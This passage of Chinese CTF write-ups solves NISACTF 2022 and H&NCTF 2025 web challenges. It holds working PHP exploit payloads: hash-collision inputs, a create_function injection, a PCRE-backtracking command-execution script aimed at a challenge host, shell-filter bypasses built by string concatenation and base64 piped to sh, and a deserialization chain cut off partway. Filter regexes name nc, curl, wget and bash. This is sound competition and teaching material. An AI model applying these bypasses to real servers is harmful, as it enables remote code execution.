class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\fastcoll_v1.0.0.5.exe -p ywj.txt -o 1.txt 2.txt</span><br><span class="line"></span><br><span class="line">ywj.txt 空文件 </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_file</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&#x27;./1.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&#x27;./2.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630102200333.png" class="" title="image-20250630102200333"><p>进入第三关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 3</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1强碰撞，<a href="https://github.com/mythkiven/SHAttered">在这里</a>下载2个pdf文件，其前320个字符sha1编码后，还是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_file</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">320</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&quot;./1.pdf&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&quot;./2.pdf&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630102622086.png" class="" title="image-20250630102622086"><p>进入第4关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>); <span class="comment"># 只需要这一步出来就好</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>php的字符串解析特性：空格  _ . 被过滤了，我们可以使用+，+号也可以被转换为下划线。</p><img src="/CTFwp/NISACTF-2022/image-20250630103103121.png" class="" title="image-20250630103103121"><p>进入第五关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只需要让$a不以数字字母下划线开头就可以。</p><p><strong>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。</strong><br><strong>调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。</strong></p><p><code>$a=\create_function&amp;$b=&#125;system(&#39;cat /f*&#39;)/*</code></p><img src="/CTFwp/NISACTF-2022/image-20250630112215449.png" class="" title="image-20250630112215449"><h2 id="middlerce"><a href="#middlerce" class="headerlink" title="middlerce"></a>middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说一说这个匹配模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m</span><br><span class="line">^.* 开头匹配任意字符0次或多次</span><br><span class="line">() 子组 \w 匹配[a-z]、[A-Z]、[0-9]、_  ^ * ( ~ ` ? / 空格 | &amp; ! &lt; &gt; &#123; x09 x0a [</span><br><span class="line">.*$ 末尾匹配任意字符0次或多次</span><br></pre></td></tr></table></figure><p>就这个匹配模式来说，php的正则引擎有很大的发挥空间，如果我们输入超过1000000个字符，^.*就可以将这1000000多个字符匹配完，匹配完以后发现后面的模式没有匹配的东西，就会开始进行回溯，每次回溯先吐出一个字符，然后进行匹配，由于我们输入了1000000多个字符，进行回溯的次数肯定超过了1000000次，preg_match就会返回false。</p><p>json_decode是用于json格式的解码，所以我们要传递json格式的数据，键为cmd。</p><p>&#x2F; 被过滤了，所以这里使用<code>?&gt;&lt;?= ?&gt;</code>，避免后面的字符报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28934/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ * ( ~ ` ? /  | &amp; ! &lt; &gt; &#123; [</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`strings /f*`;?&gt;&#x27;</span>+<span class="string">&#x27;%&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;letter&#x27;</span> : payload</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630190736453.png" class="" title="image-20250630190736453">]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF 2025</title>
      <link href="/CTFwp/H&amp;NCTF-2025/"/>
      <url>/CTFwp/H&amp;NCTF-2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123; <span class="comment">// \d 表示数字</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123; <span class="comment">// 考察数组绕过，如果参数为数组，intval转化为1</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 命令执行这里过滤的是关键字，可以通过拼接的方式绕过</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> bHM=|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#index.php</span></span><br><span class="line"></span><br><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> bHMgLw==|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br><span class="line"></span><br><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> Y2F0IC9mKg==|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line">You win!!! flag&#123;a3d1c4b1-b794-4599-8589-132129672d37&#125;</span><br><span class="line"><span class="comment"># 通过拼接，加base64编码绕过</span></span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;c=/;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br><span class="line"></span><br><span class="line">a=l;b=s;c=/;d=gre;e=p;$a<span class="variable">$b</span> <span class="variable">$c</span>|$d<span class="variable">$e</span> fl</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag.txt 构造出来flag.txt,将其赋值给f变量</span></span><br><span class="line"></span><br><span class="line">a=l;b=s;c=/;d=gre;e=p;f=$($a<span class="variable">$b</span> <span class="variable">$c</span>|$d<span class="variable">$e</span> fl);rev $c<span class="variable">$f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#125;73d276921231-9858-9954-497b-1b4c1d3a&#123;galf !!!niw uoY</span></span><br><span class="line"><span class="comment">#$()在里面起着重要作用;执行命令，并将结果捕获出来赋值给f</span></span><br></pre></td></tr></table></figure><p>方法3：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ls -a 里面有. ，通过head -n 1,截取出.。</span></span><br><span class="line">a=l;b=s;c=hea;d=d;e=$($a<span class="variable">$b</span> -a|$c<span class="variable">$d</span> -n 1);<span class="built_in">echo</span> <span class="variable">$e</span>;</span><br><span class="line"><span class="comment"># .</span></span><br><span class="line">a=l;b=s;c=hea;d=d;e=$($a<span class="variable">$b</span> -a|$c<span class="variable">$d</span> -n 1);f=fla;g=g;h=tx;i=t;j=/;rev $j$f$g$e$h<span class="variable">$i</span></span><br><span class="line"><span class="comment"># &#125;73d276921231-9858-9954-497b-1b4c1d3a&#123;galf !!!niw uoY</span></span><br></pre></td></tr></table></figure><p>方法4：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="comment">#查看环境变量</span></span><br><span class="line"><span class="variable">$KUBERNETES_SERVICE_HOST</span> <span class="comment">#含有点</span></span><br><span class="line"><span class="comment"># expr substr &quot;字符串&quot; 起始位置 长度        截取.</span></span><br><span class="line"><span class="comment"># $(expr substr $KUBERNETES_SERVICE_HOST 3 1) .</span></span><br><span class="line"><span class="comment"># 剩下的与上面相同</span></span><br></pre></td></tr></table></figure><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao; <span class="comment">// 这里可以用于触发__toString 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren)) )&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗人我吃！&#x27;</span>]); <span class="comment">//call_user_func_array与call_user_func一样，当遇到数组是，数组的第一个值会被当做类，第二个值会被当做函数。 2</span></span><br><span class="line"><span class="comment">// 这里并没有限制类型，可以通过数组绕过md5，sha1。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]); <span class="comment">// 这里进行命令执行  1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;What do you want to do?&#x27;</span>); <span class="comment">// gc回收机制</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hcf</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$hcf</span> -&gt; HongCaFei = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$db</span> -&gt; Dagongren[] = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$db</span> -&gt; Bagongren[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$db</span> -&gt; dao = <span class="keyword">array</span>(<span class="variable">$hcf</span>,<span class="string">&#x27;ls&#x27;</span>); <span class="comment">// $hct -&gt; ls(),$hcf并没有ls方法，这样就触发了__call__</span></span><br><span class="line"><span class="variable">$ggg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GOGOGO</span>();</span><br><span class="line"><span class="variable">$ggg</span> -&gt; dengchao 